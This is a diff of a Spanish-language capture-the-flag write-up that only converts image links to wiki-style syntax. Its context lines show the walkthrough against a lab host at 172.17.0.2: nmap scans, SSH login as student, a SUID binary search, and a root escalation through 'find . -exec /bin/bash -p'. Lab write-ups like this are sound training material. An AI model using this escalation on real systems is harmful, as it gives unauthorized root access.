@@ -20,13 +20,13 @@ Enumeración de servicios, Credenciales en texto plano en código fuente, Escala
 nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 172.17.0.2
 ```
 
-![](images/IMG-20260626164314273.png)
+![[IMG-20260626164314273.png]]
 
 ```bash
 nmap -p 22,8080 -sC -sV -oN allports 172.17.0.2
 ```
 
-![](images/IMG-20260626164245277.png)
+![[IMG-20260626164245277.png]]
 
 ### Enumeración Web (Puerto 8080)
 
@@ -52,7 +52,7 @@ ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
 ssh student@172.17.0.2
 ```
 
-![](images/IMG-20260626164525328.png)
+![[IMG-20260626164525328.png]]
 
 ---
 
@@ -64,7 +64,7 @@ ssh student@172.17.0.2
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![](images/IMG-20260626164619928.png)
+![[IMG-20260626164619928.png]]
 
 ### Verificación de `/etc/passwd`
 
@@ -72,7 +72,7 @@ find / -perm -4000 -type f 2>/dev/null
 ls -la /etc/passwd
 ```
 
-![](images/IMG-20260626164658415.png)
+![[IMG-20260626164658415.png]]
 
 Sin escritura para otros grupos
 
@@ -84,7 +84,7 @@ A diferencia de la máquina Password, aquí `/etc/passwd` tiene permisos correct
 find . -exec /bin/bash -p \;
 ```
 
-![](images/IMG-20260626164759443.png)
+![[IMG-20260626164759443.png]]
 
 ### Captura de Flag
 
@@ -92,7 +92,7 @@ find . -exec /bin/bash -p \;
 cd /root
 ```
 
-![](images/IMG-20260626164843204.png)
+![[IMG-20260626164843204.png]]
 
 ---
 
